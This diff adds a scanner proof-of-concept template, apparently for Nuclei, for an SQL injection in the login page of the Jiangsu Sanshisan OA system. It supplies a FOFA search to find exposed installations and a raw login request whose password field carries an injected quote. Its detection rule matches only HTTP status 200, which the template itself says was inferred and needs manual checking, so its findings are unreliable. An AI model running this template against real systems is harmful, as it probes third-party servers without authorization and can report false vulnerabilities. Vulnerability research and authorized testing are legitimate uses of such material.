@@ -1,0 +1,52 @@
+id: poc-9de33e1a2d52e5011e18
+info:
+  name: 江苏叁拾叁OA存在sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9de33e1a2d52e5011e188e5d51bbe951
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 9de33e1a2d52e5011e188e5d51bbe951
+    fofa: + fofa`app="江苏叁拾叁-OA"`
+http:
+- raw:
+  - 'POST /login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 23
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+
+    Chrome/92.0.4515.131 Safari/537.36
+
+    Accept:
+
+    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,applic
+
+    ation/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: JSESSIONID=AD52C9F9D7D46303431351876BBA1536
+
+    Connection: close
+
+
+    username=1&password=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
